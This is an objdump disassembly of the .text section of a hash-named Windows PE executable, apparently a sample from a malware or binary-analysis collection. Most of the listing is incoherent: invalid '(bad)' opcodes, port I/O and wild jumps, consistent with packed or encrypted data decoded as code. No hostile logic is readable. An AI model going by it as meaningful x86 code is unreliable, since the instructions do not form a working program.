
0b66c3fd4b417eab75fcd3965bff9805ad6c2b47bb9e85feccf017cd09b592f4.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
	...
  401020:	and    BYTE PTR [edi+esi*4],dh
  401023:	xchg   edx,eax
  401024:	jmp    0xf38833f6
  401029:	mov    bl,0x66
  40102b:	adc    al,0xf2
  40102d:	lfs    ebx,FWORD PTR [edx]
  401030:	hlt    
  401031:	sbb    dx,WORD PTR [ebp+0x6feb9dae]
  401038:	or     ebp,DWORD PTR [edi]
  40103a:	push   0xb2acf124
  40103f:	xlat   BYTE PTR ds:[ebx]
  401040:	mov    eax,ds:0xf1555ec
  401045:	test   eax,0xb29591ac
  40104a:	jbe    0x40103b
  40104c:	scas   al,BYTE PTR es:[edi]
  40104d:	cli    
  40104e:	jl     0x40109c
  401050:	(bad)  
  401052:	leave  
  401053:	leave  
  401054:	nop
  401055:	dec    edi
  401056:	jg     0x4010ca
  401058:	fstp   QWORD PTR [edi]
  40105a:	fs gs sti 
  40105d:	in     eax,dx
  40105e:	addr16 hlt 
  401060:	or     BYTE PTR [edi+0x4a],0x36
  401064:	fcom   DWORD PTR [eax]
  401066:	(bad)  
  401067:	ficomp WORD PTR [edx-0xd]
  40106a:	push   ebx
  40106b:	les    esp,FWORD PTR [esi]
  40106d:	sub    bl,BYTE PTR [edi]
  40106f:	cmc    
  401070:	sub    edx,DWORD PTR [edi+esi*8-0x7c]
  401074:	mov    WORD PTR [edi-0x4634855],es
  40107a:	mov    ds:0xd1ae61ba,al
  40107f:	xchg   ebp,eax
  401080:	mov    cs:0xa82dea95,eax
  401086:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401087:	in     eax,0xd8
  401089:	jbe    0x401069
  40108b:	mov    ebx,0xafe44edb
  401090:	inc    eax
  401091:	fmul   DWORD PTR [ebx-0x58dedd5d]
  401097:	add    bl,ch
  401099:	mov    BYTE PTR [esi],ch
  40109b:	push   0xfffffff8
  40109d:	or     al,0x71
  40109f:	iret   
  4010a0:	jbe    0x4010bf
  4010a2:	jo     0x40105c
  4010a4:	mov    ah,0xbb
  4010a6:	in     eax,dx
  4010a7:	add    esi,eax
  4010a9:	sub    eax,0x9c76913e
  4010ae:	shr    DWORD PTR [eax],0x4a
  4010b1:	cmp    BYTE PTR [esi],cl
  4010b3:	ret    
  4010b4:	cs jne 0x40111d
  4010b7:	in     eax,0x41
  4010b9:	pusha  
  4010ba:	repz pop eax
  4010bc:	sbb    cl,BYTE PTR [edi-0x6d]
  4010bf:	fstp   DWORD PTR [edx]
  4010c1:	jno    0x4010ce
  4010c3:	xchg   ebx,eax
  4010c4:	adc    al,0xb9
  4010c6:	ja     0x4010ed
  4010c8:	repz push esp
  4010ca:	mov    eax,ds:0x82893f43
  4010cf:	dec    edx
  4010d0:	retf   
  4010d1:	aaa    
  4010d2:	mov    al,0xf1
  4010d4:	stos   BYTE PTR es:[edi],al
  4010d5:	cmp    DWORD PTR [eax],ebp
  4010d7:	into   
  4010d8:	mov    dh,0x8f
  4010da:	not    BYTE PTR [eax-0x542cd4c0]
  4010e0:	ret    0xa227
  4010e3:	add    BYTE PTR [edi-0x565e55b8],dl
  4010e9:	adc    eax,0xbeff79ef
  4010ee:	inc    edx
  4010ef:	hlt    
  4010f0:	(bad)
  4010f4:	and    bh,BYTE PTR [ebx+esi*1+0x3c]
  4010f8:	jl     0x401140
  4010fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4010fb:	jns    0x4010a0
  4010fd:	imul   edi,DWORD PTR [ecx+0x193bf6c5],0x4e
  401104:	loop   0x40111a
  401106:	mov    edi,0x8deec263
  40110b:	stos   DWORD PTR es:[edi],eax
  40110c:	push   eax
  40110d:	mov    eax,0xea4d5edc
  401112:	and    al,0x37
  401114:	mov    bl,0xcc
  401116:	add    ebp,DWORD PTR cs:[esi+0x4b]
  40111a:	push   esi
  40111b:	add    dl,BYTE PTR ds:0xdf92a106
  401121:	enter  0x2c07,0x50
  401125:	pop    edi
  401126:	push   0x285272f6
  40112b:	nop
  40112c:	jg     0x4010bf
  40112e:	(bad)  [eax+0x9]
  401131:	xor    DWORD PTR [ecx+esi*2],ebx
  401134:	xchg   ecx,eax
  401135:	xchg   DWORD PTR ds:0x6938e8d4,esp
  40113b:	call   0xfd4b1d50
  401140:	push   edx
  401141:	hlt    
  401142:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401143:	mov    DWORD PTR [eax+0x2c9b3658],esp
  401149:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40114a:	imul   eax,DWORD PTR [eax+0x3c121748],0x13
  401151:	sub    esi,DWORD PTR [ecx]
  401153:	jecxz  0x4011d3
  401155:	repz mov al,0x25
  401158:	jp     0x401198
  40115a:	mov    al,ds:0x58a39336
  40115f:	lahf   
  401160:	sbb    bl,al
  401162:	add    al,dl
  401164:	sbb    ch,BYTE PTR [eax]
  401166:	jae    0x4011bf
  401168:	mov    edi,0xc52a3e91
  40116d:	mov    ebx,0xaab046b0
  401172:	cwde   
  401173:	outs   dx,DWORD PTR ds:[esi]
  401174:	fdiv   st,st(5)
  401176:	and    bh,BYTE PTR [esi+0x28]
  401179:	fwait
  40117a:	(bad)  
  40117b:	pop    eax
  40117c:	xchg   ah,dh
  40117e:	pop    esp
  40117f:	test   BYTE PTR [edi+0x3d0e29f2],bl
  401185:	mov    dh,0x2c
  401187:	sbb    al,0x4b
  401189:	pushf  
  40118a:	in     al,dx
  40118b:	inc    eax
  40118c:	cmc    
  40118d:	push   ss
  40118e:	popf   
  40118f:	into   
  401190:	cs xchg esp,eax
  401192:	push   cs
  401193:	or     DWORD PTR [edx],edi
  401195:	cmp    bl,bh
  401197:	retf   0x74c
  40119a:	hlt    
  40119b:	in     eax,dx
  40119c:	cmp    BYTE PTR ds:[esi+0x1c],cl
  4011a0:	(bad)  
  4011a2:	sub    bh,bl
  4011a4:	lahf   
  4011a5:	into   
  4011a6:	push   ebp
  4011a7:	in     al,0xa3
  4011a9:	and    eax,0xfd29b30f
  4011ae:	pop    esp
  4011af:	in     al,dx
  4011b0:	mov    BYTE PTR [esi-0x33],dl
  4011b3:	mov    BYTE PTR [esi],bl
  4011b5:	push   ecx
  4011b6:	push   ss
  4011b7:	jne    0x401194
  4011b9:	cwde   
  4011ba:	ss popa 
  4011bc:	cmp    dl,BYTE PTR [ecx]
  4011be:	add    bl,dh
  4011c0:	inc    ecx
  4011c1:	pop    esi
  4011c2:	sbb    DWORD PTR [ecx],esi
  4011c4:	pop    ds
  4011c5:	test   DWORD PTR [eax],edi
  4011c7:	adc    dh,BYTE PTR [esi]
  4011c9:	xchg   ebx,eax
  4011ca:	out    0x26,eax
  4011cc:	or     eax,0xad49e3af
  4011d1:	dec    ebx
  4011d2:	inc    ecx
  4011d3:	outs   dx,BYTE PTR ds:[esi]
  4011d4:	push   edi
  4011d5:	or     ecx,DWORD PTR [ebp-0x6da6f927]
  4011db:	out    0x37,al
  4011dd:	in     al,0xea
  4011df:	push   0xffffffa0
  4011e1:	stos   BYTE PTR es:[edi],al
  4011e2:	rol    al,cl
  4011e4:	sbb    eax,DWORD PTR ds:0x35f8
  4011e9:	mov    ah,0xda
  4011eb:	dec    edx
  4011ec:	add    BYTE PTR [edi],al
  4011ee:	mov    ch,0xa4
  4011f0:	push   edi
  4011f1:	mov    ch,0x70
  4011f3:	xor    dl,BYTE PTR [eax+edx*2+0x5cec1687]
  4011fa:	loope  0x401264
  4011fc:	adc    DWORD PTR [edi+0x69491866],0xcd29b33d
  401206:	nop
  401207:	js     0x401284
  401209:	in     eax,dx
  40120a:	xchg   edi,eax
  40120b:	inc    esi
  40120c:	fnsave [eax+0x56]
  40120f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401210:	shl    DWORD PTR [ebp+0x45],cl
  401213:	in     eax,dx
  401214:	mov    esp,0x4316f9f2
  401219:	mov    ebx,0xf582add8
  40121e:	mov    ch,dl
  401220:	jne    0x40126d
  401222:	imul   edi,DWORD PTR [ebp-0x4326900],0x41
  401229:	fisttp WORD PTR [edi+0x25]
  40122c:	pop    ss
  40122d:	and    al,0xbb
  40122f:	inc    edx
  401230:	mov    esi,0xc28efaca
  401235:	or     eax,0xf3a4ae9f
  40123a:	xchg   ebx,eax
  40123b:	outs   dx,BYTE PTR ds:[esi]
  40123c:	repz repnz xor al,0x3a
  401240:	adc    DWORD PTR [ebx-0x6a],esi
  401243:	imul   ecx,DWORD PTR [ebx+eax*1-0x71],0x4ea040c8
  40124b:	sbb    eax,ecx
  40124d:	shr    bh,1
  40124f:	imul   eax,DWORD PTR [ebx],0x5a87ee74
  401255:	sbb    esi,DWORD PTR [ebp-0x26]
  401258:	push   es
  401259:	xor    eax,0xdda111bd
  40125e:	scas   al,BYTE PTR es:[edi]
  40125f:	jns    0x40125b
  401261:	test   eax,0x5038ebfc
  401266:	mov    ebp,0x77cc40e7
  40126b:	mov    al,0x2f
  40126d:	push   cs
  40126e:	repz out dx,eax
  401270:	rol    DWORD PTR [esi-0x19c73769],0xd4
  401277:	in     al,dx
  401278:	ror    DWORD PTR [ecx],0xa5
  40127b:	imul   ebp,DWORD PTR [eax-0x299c9830],0x4d8da50a
  401285:	jb     0x401260
  401287:	pop    ebx
  401288:	mov    bh,ch
  40128a:	cwde   
  40128b:	aam    0x30
  40128d:	push   ds
  40128e:	mov    dh,0x41
  401290:	outs   dx,DWORD PTR ds:[esi]
  401291:	jns    0x401276
  401293:	mov    ecx,0x6fab988f
  401298:	xlat   BYTE PTR ds:[ebx]
  401299:	mov    ecx,0xf5e0f17a
  40129e:	gs popa 
  4012a0:	std    
  4012a1:	stc    
  4012a2:	les    edi,FWORD PTR [ebx]
  4012a4:	dec    edx
  4012a5:	pop    DWORD PTR [eax]
  4012a7:	xor    dl,BYTE PTR [esi]
  4012a9:	(bad)  
  4012aa:	xchg   ecx,eax
  4012ab:	cs jle 0x40131a
  4012ae:	or     ecx,0x65567a41
  4012b4:	enter  0x40e2,0x8c
  4012b8:	je     0x401336
  4012ba:	sub    DWORD PTR [ecx],0xfffffffe
  4012bd:	enter  0x2b13,0x7c
  4012c1:	fistp  DWORD PTR [ecx+ebx*8-0x76]
  4012c5:	xor    DWORD PTR [edi+edx*4-0x2c7d069e],edx
  4012cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4012cd:	push   ebp
  4012ce:	pop    ecx
  4012cf:	outs   dx,DWORD PTR ds:[esi]
  4012d0:	push   es
  4012d1:	loop   0x4012e8
  4012d3:	sti    
  4012d4:	sbb    BYTE PTR [ebx],bh
  4012d6:	dec    edx
  4012d7:	adc    BYTE PTR [esi],al
  4012d9:	xchg   ebp,eax
  4012da:	pop    ecx
  4012db:	daa    
  4012dc:	rcr    ecx,cl
  4012de:	test   DWORD PTR [ebx],ecx
  4012e0:	retf   
  4012e1:	ins    DWORD PTR es:[edi],dx
  4012e2:	in     al,0x36
  4012e4:	jbe    0x401294
  4012e6:	cwde   
  4012e7:	pop    esi
  4012e8:	dec    DWORD PTR [eax+0x4c6e5553]
  4012ee:	dec    ebx
  4012ef:	repnz ins BYTE PTR es:[edi],dx
  4012f1:	(bad)  
  4012f2:	xlat   BYTE PTR ds:[ebx]
  4012f3:	and    al,0x53
  4012f5:	xchg   DWORD PTR [edx+eiz*2-0x18],ecx
  4012f9:	sbb    DWORD PTR [edx+0x66],esi
  4012fc:	ins    BYTE PTR es:[edi],dx
  4012fd:	loop   0x4012e2
  4012ff:	mov    edi,0x46010b41
  401304:	push   edi
  401305:	or     al,0x2f
  401307:	aad    0xc1
  401309:	adc    BYTE PTR [edi],dh
  40130b:	popa   
  40130c:	xchg   dl,ah
  40130e:	push   ebx
  40130f:	outs   dx,BYTE PTR cs:[esi]
  401311:	ins    DWORD PTR es:[edi],dx
  401312:	xchg   DWORD PTR [esi],edi
  401314:	push   0x5e71704f
  401319:	(bad)  
  40131a:	outs   dx,DWORD PTR ds:[esi]
  40131b:	mov    ebp,0x4a10e325
  401320:	out    0xcc,al
  401322:	jp     0x401360
  401324:	and    BYTE PTR [edi+ebp*8-0x9],0xcf
  401329:	dec    edi
  40132a:	(bad)  
  40132b:	mov    eax,0x795a8a08
  401330:	rcr    bl,cl
  401332:	jo     0x40139a
  401334:	sar    DWORD PTR [edx],1
  401336:	jmp    0xf283:0xae3611f6
  40133d:	fcmovne st,st(5)
  40133f:	pop    ebx
  401340:	xchg   ecx,eax
  401341:	test   al,0xf1
  401343:	add    al,al
  401345:	mov    dh,0x24
  401347:	push   0x9e08722d
  40134c:	xor    ebp,esp
  40134e:	dec    ebx
  40134f:	aas    
  401350:	je     0x4012f3
  401352:	and    BYTE PTR [esi-0x3505d316],bh
  401358:	adc    eax,0x40c2ddf7
  40135d:	jle    0x401343
  40135f:	sub    DWORD PTR [eax+eax*1+0x5b],eax
  401363:	popf   
  401364:	and    eax,0x7ed06e3d
  401369:	int    0xeb
  40136b:	sbb    DWORD PTR [ebx],esi
  40136d:	inc    ebx
  40136e:	nop
  40136f:	push   ss
  401370:	mov    ch,0x6
  401372:	mov    eax,ds:0x5425345b
  401377:	jb     0x401324
  401379:	jge    0x401364
  40137b:	add    al,0x44
  40137d:	iret   
  40137e:	pop    ebp
  40137f:	mov    edi,0xcfd2308e
  401384:	(bad)  
  401385:	cmp    DWORD PTR [ecx+ebp*8-0x23],esi
  401389:	lods   eax,DWORD PTR ds:[esi]
  40138a:	dec    eax
  40138b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40138c:	dec    esp
  40138d:	ret    
  40138e:	pusha  
  40138f:	xor    ebx,edx
  401391:	cs jo  0x4013c2
  401394:	mov    ds:0xd0717769,eax
  401399:	cwde   
  40139a:	jbe    0x40138b
  40139c:	cld    
  40139d:	inc    edx
  40139e:	dec    edx
  40139f:	pop    edx
  4013a0:	inc    ecx
  4013a1:	mov    ebx,ds
  4013a3:	mov    esi,0x42046ce0
  4013a8:	jae    0x4013ec
  4013aa:	push   ss
  4013ab:	cmp    dh,cl
  4013ad:	cmc    
  4013ae:	lods   eax,DWORD PTR ds:[esi]
  4013af:	retf   
  4013b0:	adc    esi,eax
  4013b2:	add    DWORD PTR [ecx-0x57],0xcb5a67d8
  4013b9:	adc    DWORD PTR [edx+0x22],ebp
  4013bc:	sub    dl,BYTE PTR [esi+0x3d]
  4013bf:	(bad)
  4013c2:	das    
  4013c3:	sub    eax,0xcfc384cd
  4013c8:	push   edi
  4013c9:	dec    ecx
  4013ca:	push   ecx
  4013cb:	add    DWORD PTR [edi],eax
  4013cd:	jge    0x401353
  4013cf:	(bad)  
  4013d0:	mov    dh,0x13
  4013d2:	sbb    DWORD PTR [ecx+0x54],esp
  4013d5:	jmp    0x401392
  4013d7:	and    al,0x75
  4013d9:	pop    esp
  4013da:	jns    0x4013e2
  4013dc:	in     eax,dx
  4013dd:	adc    esi,esp
  4013df:	lock mov al,0x4c
  4013e2:	out    dx,al
  4013e3:	stc    
  4013e4:	dec    esi
  4013e5:	repz and al,0x1e
  4013e8:	stos   DWORD PTR es:[edi],eax
  4013e9:	pop    ss
  4013ea:	push   ecx
  4013eb:	adc    al,0xb8
  4013ed:	mov    DWORD PTR [edx],edi
  4013ef:	(bad)  
  4013f1:	xchg   ebp,eax
  4013f2:	iret   
  4013f3:	or     ch,ah
  4013f5:	mov    ch,0x72
  4013f7:	cmp    edx,edi
  4013f9:	inc    eax
  4013fa:	jl     0x4013b9
  4013fc:	add    BYTE PTR [ebp-0x176d0052],bl
  401402:	sbb    dh,BYTE PTR [edx+ebp*1]
  401405:	sti    
  401406:	imul   edi,ebx,0xffffff9c
  401409:	sbb    DWORD PTR [esi+0x7ac36d43],0x4
  401410:	xor    al,0xfa
  401412:	cmp    BYTE PTR [ebp+ebx*8-0x7751ba3f],dl
  401419:	sbb    ebp,ebx
  40141b:	add    edi,DWORD PTR [edx-0xe]
  40141e:	sti    
  40141f:	mov    cl,BYTE PTR [esi+ebx*4+0x2faede]
  401426:	lods   al,BYTE PTR ds:[esi]
  401427:	stos   BYTE PTR es:[edi],al
  401428:	inc    eax
  401429:	push   eax
  40142a:	ss cmp eax,0x42c133be
  401430:	(bad)  
  401431:	cmp    ebx,ebx
  401433:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401434:	or     dh,BYTE PTR [eax+0x34d395fa]
  40143a:	in     eax,0x9d
  40143c:	jle    0x40141d
  40143e:	dec    ebp
  40143f:	adc    BYTE PTR [edi+0x2b],bl
  401442:	(bad)  
  401443:	dec    ebp
  401444:	pop    ebp
  401445:	icebp  
  401446:	bound  esp,QWORD PTR [edi+edi*1]
  401449:	imul   edi,DWORD PTR [ebx-0x4d],0x84d9d28b
  401450:	icebp  
  401451:	pop    ebx
  401452:	popa   
  401453:	dec    edi
  401454:	mov    dh,BYTE PTR ds:0x7610995c
  40145a:	mov    esi,0x1e81df17
  40145f:	sbb    BYTE PTR cs:[eax-0x50f509fc],dl
  401466:	mov    al,bl
  401468:	push   edx
  401469:	ja     0x40146a
  40146b:	adc    DWORD PTR [eax],esp
  40146d:	dec    ebp
  40146e:	pop    esp
  40146f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401470:	cdq    
  401471:	idiv   ah
  401473:	ret    
  401474:	mov    eax,0x937e065a
  401479:	mov    WORD PTR [esi],ss
  40147b:	mov    ecx,0xb7c2ccc0
  401480:	gs out dx,eax
  401482:	scas   al,BYTE PTR es:[edi]
  401483:	jle    0x4014d9
  401485:	xor    al,0x50
  401487:	mov    ecx,DWORD PTR [ecx-0x7a]
  40148a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40148b:	fcmovne st,st(3)
  40148d:	call   0xf0ceb602
  401492:	and    al,0x1c
  401494:	ret    0xa4c1
  401497:	jo     0x4014b9
  401499:	add    bh,BYTE PTR [edi+0x509e7069]
  40149f:	(bad)  
  4014a0:	fldenv [ebx+0x71e4b58b]
  4014a6:	inc    esi
  4014a7:	add    ch,BYTE PTR [eax+0x13]
  4014aa:	fwait
  4014ab:	push   edx
  4014ac:	fcomp  DWORD PTR [eax+esi*2+0x51]
  4014b0:	add    DWORD PTR [edx],esp
  4014b2:	add    ebp,DWORD PTR [ecx-0x18]
  4014b5:	int3   
  4014b6:	loope  0x401460
  4014b8:	cmc    
  4014b9:	pop    esp
  4014ba:	push   ebx
  4014bb:	js     0x4014bc
  4014bd:	xor    eax,0x24e1ac26
  4014c2:	add    al,0xfb
  4014c4:	(bad)  
  4014c5:	sub    BYTE PTR [ecx],ch
  4014c7:	push   ecx
  4014c8:	test   dl,0x98
  4014cb:	(bad)  
  4014cc:	and    eax,0x63eb3573
  4014d1:	call   0x1d61:0x14b9cc25
  4014d8:	jo     0x401530
  4014da:	xlat   BYTE PTR ds:[ebx]
  4014db:	or     ecx,DWORD PTR [eax]
  4014dd:	xchg   esi,eax
  4014de:	jo     0x4014f4
  4014e0:	sbb    edi,DWORD PTR [edi+0x2b5ef913]
  4014e6:	mov    al,0xb5
  4014e8:	jb     0x4014e3
  4014ea:	or     BYTE PTR [ebp+0xf],bh
  4014ed:	sbb    DWORD PTR [ebx+0x71],0xc2ee7031
  4014f4:	mov    eax,0xd0c15c15
  4014f9:	std    
  4014fa:	xchg   esi,eax
  4014fb:	fisubr DWORD PTR [ebp-0x31]
  4014fe:	data16 cmp bl,BYTE PTR [ebx]
  401501:	call   0x61bbf44e
  401506:	cmp    eax,0xcf2f6d02
  40150b:	pop    eax
  40150c:	test   DWORD PTR [ebx],ebx
  40150e:	lea    eax,[ebx]
  401510:	pop    es
  401511:	mov    ds:0x247a375,eax
  401516:	add    DWORD PTR [ebx],edx
  401518:	inc    edx
  401519:	in     eax,0x50
  40151b:	adc    ch,bh
  40151d:	sbb    eax,0xb7736b86
  401522:	les    edx,FWORD PTR [ebx-0x77675fed]
  401528:	xchg   ebx,eax
  401529:	jle    0x4014e4
  40152b:	xlat   BYTE PTR ds:[ebx]
  40152c:	jmp    0x4014f1
  40152e:	pop    eax
  40152f:	xchg   ebp,eax
  401530:	jl     0x40151f
  401532:	inc    eax
  401533:	pushf  
  401534:	fld    TBYTE PTR [ebx]
  401536:	push   esp
  401537:	cmp    BYTE PTR [edx-0x49eef2d0],ch
  40153d:	xor    ebx,DWORD PTR ss:[eax+0x50]
  401541:	push   eax
  401542:	(bad)  ds:0x6fa0f4f0
  401548:	pop    es
  401549:	(bad)  
  40154a:	and    eax,0xcaaa235d
  40154f:	or     al,0x49
  401551:	add    eax,0x538eb0ac
  401556:	jecxz  0x4015a8
  401558:	imul   esi
  40155a:	idiv   DWORD PTR [ecx]
  40155c:	xchg   ecx,eax
  40155d:	pop    es
  40155e:	cmp    DWORD PTR [ebp+ecx*8-0x7d],esi
  401562:	or     DWORD PTR [edx-0x62d723d3],eax
  401568:	test   al,0x3c
  40156a:	rcl    BYTE PTR [edx],0x6c
  40156d:	inc    edx
  40156e:	mov    al,ds:0xdb91ac0c
  401573:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401574:	test   DWORD PTR [eax],ebp
  401576:	retf   
  401577:	outs   dx,DWORD PTR ds:[esi]
  401578:	or     dl,bh
  40157a:	sbb    esi,DWORD PTR [eax-0x157bc637]
  401580:	mov    edi,ss
  401582:	lods   al,BYTE PTR ds:[esi]
  401583:	mov    ecx,0x8e33794d
  401588:	xor    edx,esi
  40158a:	(bad)  
  40158b:	jmp    0x40154d
  40158d:	xor    al,0x6
  40158f:	mov    bl,0xa6
  401591:	mov    ah,0x1c
  401593:	cwde   
  401594:	pop    ebp
  401595:	jmp    0x401606
  401597:	dec    ecx
  401598:	xchg   ebx,eax
  401599:	ror    BYTE PTR [edi+0x5df8f41e],1
  40159f:	lds    esi,FWORD PTR [esi+0xc]
  4015a2:	xchg   edx,eax
  4015a3:	sti    
  4015a4:	das    
  4015a5:	or     BYTE PTR [esi],al
  4015a7:	inc    ebx
  4015a8:	xor    DWORD PTR [ecx-0xa],ebx
  4015ab:	mov    ah,0x15
  4015ad:	out    0xf8,al
  4015af:	mov    al,ds:0x49a73a83
  4015b4:	jge    0x40156a
  4015b6:	popa   
  4015b7:	mov    ebx,0x35432c81
  4015bc:	bnd jg 0x40160d
  4015bf:	xchg   ecx,eax
  4015c0:	ds jnp 0x40163f
  4015c3:	aas    
  4015c4:	mul    BYTE PTR [ecx+0x75a801b4]
  4015ca:	aas    
  4015cb:	inc    esi
  4015cc:	loop   0x401610
  4015ce:	mov    eax,DWORD PTR [edx]
  4015d0:	std    
  4015d1:	js     0x401607
  4015d3:	pusha  
  4015d4:	xor    DWORD PTR [ebp+0x2f],esp
  4015d7:	and    bl,bl
  4015d9:	xor    eax,0xc982b281
  4015de:	or     ebx,DWORD PTR [ecx]
  4015e0:	shl    BYTE PTR [ebp-0x61deb842],1
  4015e6:	adc    al,0x91
  4015e8:	int    0x16
  4015ea:	fdivr  st,st(4)
  4015ec:	add    eax,0x726322a1
  4015f1:	ins    BYTE PTR es:[edi],dx
  4015f2:	jmp    0x8d83:0x504c727f
  4015f9:	sbb    DWORD PTR [eax],esi
  4015fb:	sub    al,0xb0
  4015fd:	push   ecx
  4015fe:	popa   
  4015ff:	scas   al,BYTE PTR es:[edi]
  401600:	fs mov al,0xf6
  401603:	xchg   edx,eax
  401604:	fisubr DWORD PTR [ecx]
  401606:	dec    eax
  401607:	outs   dx,BYTE PTR ds:[esi]
  401608:	push   cs
  401609:	cmp    al,0xa5
  40160b:	jecxz  0x4015dc
  40160d:	sub    BYTE PTR [ebp-0x71],0x3f
  401611:	mov    ebp,0x8ef647b0
  401616:	popa   
  401617:	fsub   QWORD PTR [eax+0x3d]
  40161a:	aaa    
  40161b:	push   ds
  40161c:	add    eax,esi
  40161e:	ror    BYTE PTR [esi],0x1b
  401621:	inc    eax
  401622:	sbb    ch,ch
  401624:	adc    eax,eax
  401626:	in     eax,0x22
  401628:	leave  
  401629:	mov    eax,0xc8ee06f0
  40162e:	sbb    dl,bh
  401630:	xchg   edx,eax
  401631:	call   0xa160:0xc4f2c961
  401638:	bound  esp,QWORD PTR [esi-0x9]
  40163b:	clc    
  40163c:	cld    
  40163d:	mov    ds:0x958ce0e,eax
  401642:	leave  
  401643:	mov    edx,0x3bfc0b54
  401648:	sbb    DWORD PTR [edi+0x53],ebx
  40164b:	push   esp
  40164c:	stc    
  40164d:	aad    0xe6
  40164f:	lods   eax,DWORD PTR ds:[esi]
  401650:	pop    esi
  401651:	cmp    DWORD PTR [edi],esp
  401653:	bound  esi,QWORD PTR [edi]
  401655:	mov    al,ds:0xf26637ce
  40165a:	xchg   esi,eax
  40165b:	ja     0x401654
  40165d:	ds sar DWORD PTR es:[ecx],0xa
  401662:	push   cs
  401663:	sub    edi,DWORD PTR [ebp-0x1530eb7b]
  401669:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40166a:	loopne 0x401666
  40166c:	jae    0x40163d
  40166e:	jne    0x40162b
  401670:	mov    dh,BYTE PTR [ebx+0x7d]
  401673:	pop    edi
  401674:	jp     0x4016d3
  401676:	shl    BYTE PTR [edx-0x2f],0xf7
  40167a:	pop    ss
  40167b:	pop    eax
  40167c:	fdivr  DWORD PTR [ebx]
  40167e:	repnz add bh,BYTE PTR [esi]
  401681:	xchg   esp,eax
  401682:	ja     0x401640
  401684:	int3   
  401685:	(bad)  
  401686:	xchg   esp,eax
  401687:	mov    ds:0x6be3d8c0,al
  40168c:	jmp    0x40168b
  40168e:	fsubr  st,st(4)
  401690:	js     0x401671
  401692:	sub    esp,DWORD PTR [ebp+0x632562ec]
  401698:	repz (bad) 
  40169a:	fcom   QWORD PTR [edx]
  40169c:	and    eax,0x76b9bc64
  4016a1:	and    BYTE PTR [edx-0x2a0b4c60],dl
  4016a7:	push   0xffffffee
  4016a9:	mov    WORD PTR [edi],gs
  4016ab:	push   esp
  4016ac:	sub    DWORD PTR [edx],esp
  4016ae:	inc    esi
  4016af:	lods   eax,DWORD PTR ds:[esi]
  4016b0:	inc    esi
  4016b1:	pushf  
  4016b2:	iret   
  4016b3:	xchg   ebp,eax
  4016b4:	das    
  4016b5:	jecxz  0x40168c
  4016b7:	cli    
  4016b8:	inc    eax
  4016b9:	test   DWORD PTR [esi-0x32],eax
  4016bc:	cld    
  4016bd:	mov    ?,WORD PTR [esi-0x685c0f73]
  4016c3:	out    dx,al
  4016c4:	loop   0x401725
  4016c6:	xor    al,ch
  4016c8:	ds icebp 
  4016ca:	jl     0x4016b3
  4016cc:	shl    esi,0xce
  4016cf:	dec    edi
  4016d0:	xchg   bx,ax
  4016d2:	jecxz  0x401705
  4016d4:	nop
  4016d5:	xlat   BYTE PTR ds:[ebx]
  4016d6:	xor    BYTE PTR [eax+edi*2+0x4f],cl
  4016da:	ins    DWORD PTR es:[edi],dx
  4016db:	cmp    ah,BYTE PTR [edx-0x19be603]
  4016e1:	aam    0x92
  4016e3:	dec    DWORD PTR [esi+0x6f236d5d]
  4016e9:	repz shr BYTE PTR [ebx-0x83210e7],cl
  4016f0:	neg    ebx
  4016f2:	cmc    
  4016f3:	mov    ch,0x8e
  4016f5:	adc    dh,BYTE PTR [ebx]
  4016f7:	sbb    ch,BYTE PTR [edx]
  4016f9:	mov    cl,0xd4
  4016fb:	in     al,dx
  4016fc:	std    
  4016fd:	dec    ebx
  4016fe:	int    0x57
  401700:	jae    0x401780
  401702:	fnstcw WORD PTR [ecx]
  401704:	shl    edx,0xab
  401707:	ins    DWORD PTR es:[edi],dx
  401708:	cmp    BYTE PTR ss:[edi-0x5a0ee89e],dl
  40170f:	mov    ds:0x46f511b0,al
  401714:	add    eax,0x4755de07
  401719:	add    edx,DWORD PTR [eax]
  40171b:	jmp    0x2f88:0x81060a5
  401722:	test   al,0xd0
  401724:	shl    DWORD PTR [ebx],cl
  401726:	sti    
  401727:	jp     0x4017a8
  401729:	aad    0xde
  40172b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40172c:	(bad)  
  40172d:	fdiv   QWORD PTR [ecx+0x50c16942]
  401733:	in     eax,0xde
  401735:	xchg   BYTE PTR [edx-0x71],ah
  401738:	jbe    0x4016f4
  40173a:	aaa    
  40173b:	push   0x5d33d7b0
  401740:	mov    gs,WORD PTR [ebp-0x3]
  401743:	mov    WORD PTR [edi-0x3c],gs
  401746:	retf   
  401747:	mov    ebx,0x2d845d32
  40174c:	xor    BYTE PTR [ecx+0x3eae6b73],bl
  401752:	stc    
  401753:	cmp    eax,0x609ff030
  401758:	in     al,0xe0
  40175a:	or     al,0xaf
  40175c:	sbb    BYTE PTR [edi+0x10],dh
  40175f:	pop    edx
  401760:	push   0x23
  401762:	into   
  401763:	sbb    bh,BYTE PTR [ecx-0x72]
  401766:	ja     0x401742
  401768:	xchg   esp,eax
  401769:	mov    ds:0x70e6a063,al
  40176e:	mov    esi,0x72d71e13
  401773:	sub    bh,BYTE PTR [eax]
  401775:	xor    ebx,DWORD PTR [ebx+0x28]
  401778:	mov    ds:0x4c2696d9,eax
  40177d:	popa   
  40177e:	sub    bh,BYTE PTR [edi+0x32427282]
  401784:	iret   
  401785:	sub    al,0x77
  401787:	(bad)  [esp+edi*8+0x24]
  40178b:	sbb    al,0xe3
  40178d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40178e:	and    al,0x8c
  401790:	cld    
  401791:	addr16 call 0x18da:0x122d3154
  401799:	retf   0xfaf6
  40179c:	add    ebx,DWORD PTR [ecx+ecx*2]
  40179f:	jge    0x401790
  4017a1:	add    al,0xe9
  4017a3:	shl    BYTE PTR [eax],cl
  4017a5:	mov    esp,0x691d902a
  4017aa:	lahf   
  4017ab:	push   ds
